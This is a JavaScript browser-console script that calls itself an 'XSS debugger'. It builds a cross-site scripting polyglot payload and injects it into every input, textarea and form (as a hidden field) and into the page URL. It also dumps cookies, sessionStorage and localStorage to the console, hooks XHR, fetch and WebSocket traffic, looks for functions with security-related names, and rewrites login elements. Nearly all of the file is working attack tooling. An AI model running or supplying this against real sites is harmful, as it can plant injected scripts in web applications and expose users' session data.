(function() {
    console.log("%c[DEBUG] Advanced XSS Debugger Running...", "color: cyan; font-weight: bold;");

    /*** 🚀 XSS Polyglot Payload Encoder ***/
    function encodeXSSPayload(payload) {
        let polyglot_start = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+";
        let polyglot_end = "{}//";
        return polyglot_start + payload + polyglot_end;
    }

    /*** 🚀 Hooking into JavaScript Errors & Security Warnings ***/
    window.onerror = function(message, source, lineno, colno, error) {
        console.warn("%c[JS ERROR DETECTED]", "color: red; font-weight: bold;", message, "at", source, ":", lineno, colno);
    };

    /*** 🚀 Intercepting Network Requests (XHR & Fetch) ***/
    (function() {
        let open = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            console.log(`%c[XHR INTERCEPT] ${method} request to: ${url}`, "color: orange;");
            return open.apply(this, arguments);
        };

        let originalFetch = window.fetch;
        window.fetch = async function(...args) {
            console.log(`%c[FETCH INTERCEPT] Request to: ${args[0]}`, "color: yellow;");
            return originalFetch.apply(this, args);
        };
    })();

    /*** 🚀 WebSocket Interception (Real-Time Monitoring) ***/
    (function() {
        let ws = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            console.log(`%c[WebSocket INTERCEPT] Connecting to: ${url}`, "color: lime;");
            let instance = new ws(url, protocols);
            instance.addEventListener("message", function(event) {
                console.log(`[WS MESSAGE] ${event.data}`);
            });
            return instance;
        };
    })();

    /*** 🚀 Monitoring DOM Changes (Detecting Hidden Elements & Dynamic Content) ***/
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            console.log("[DOM CHANGE DETECTED]", mutation);
        });
    });
    observer.observe(document, { childList: true, subtree: true });

    /*** 🚀 Extracting Session Data (Cookies, sessionStorage, localStorage) ***/
    function extractStorageData() {
        let storedData = {};

        // Cookies
        storedData["Cookies"] = document.cookie;

        // sessionStorage
        for (let key in sessionStorage) {
            storedData[`sessionStorage_${key}`] = sessionStorage.getItem(key);
        }

        // localStorage
        for (let key in localStorage) {
            storedData[`localStorage_${key}`] = localStorage.getItem(key);
        }

        console.log("%c[STORAGE DUMP]", "color: cyan; font-weight: bold;", storedData);
    }

    extractStorageData();

    /*** 🚀 Injecting XSS Payload into Inputs & Forms ***/
    function injectXSS() {
        let payload = encodeXSSPayload("alert('XSS Debugger Executed!')");
        console.log("%c[INJECTING XSS PAYLOAD]", "color: red; font-weight: bold;", payload);

        document.querySelectorAll("input, textarea, form").forEach(el => {
            if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
                el.value = payload;
            } else if (el.tagName === "FORM") {
                let hiddenInput = document.createElement("input");
                hiddenInput.type = "hidden";
                hiddenInput.name = "xss";
                hiddenInput.value = payload;
                el.appendChild(hiddenInput);
            }
        });

        // Try URL injection
        history.pushState({}, "", window.location.pathname + `?xss=${encodeURIComponent(payload)}`);
    }

    injectXSS();

    /*** 🚀 Monitoring Event Listeners (Tracking Clicks & Key Inputs) ***/
    function getEventListeners() {
        let eventListeners = [];
        for (let key in window) {
            if (/^on/.test(key) && window[key] !== null) {
                eventListeners.push(key);
            }
        }
        console.log("%c[EVENT LISTENERS DETECTED]:", "color: magenta;", eventListeners);
    }

    getEventListeners();

    /*** 🚀 Detecting & Analyzing JavaScript Security Functions ***/
    function detectSecurityFunctions() {
        let securityKeywords = ["integrity", "sandbox", "security", "antiDebug", "detectDebugger"];
        let foundFunctions = [];

        for (let key in window) {
            if (typeof window[key] === "function" && securityKeywords.some(word => key.toLowerCase().includes(word))) {
                foundFunctions.push(key);
            }
        }

        console.log("%c[SECURITY FUNCTIONS DETECTED]:", "color: red; font-weight: bold;", foundFunctions);
    }

    detectSecurityFunctions();

    /*** 🚀 UI Debugging: Modify Key Elements ***/
    function modifyUI() {
        console.log("%c[MODIFYING UI TO HIGHLIGHT DEBUG MODE]", "color: green;");
        
        let loginElements = document.querySelectorAll("[data-testid*='login'], [class*='login']");
        loginElements.forEach(el => {
            el.innerHTML = "🔓 Debug Mode Active";
            el.style.color = "red";
        });

        let navbar = document.querySelector("nav");
        if (navbar) {
            let newElem = document.createElement("div");
            newElem.innerHTML = "<b>🛠 Debug Mode Active 🛠</b>";
            newElem.style.color = "blue";
            newElem.style.fontSize = "18px";
            navbar.appendChild(newElem);
        }
    }

    modifyUI();

    console.log("%c[DEBUGGER ACTIVE WITH XSS INJECTION] ✅", "color: green; font-weight: bold;");
})();
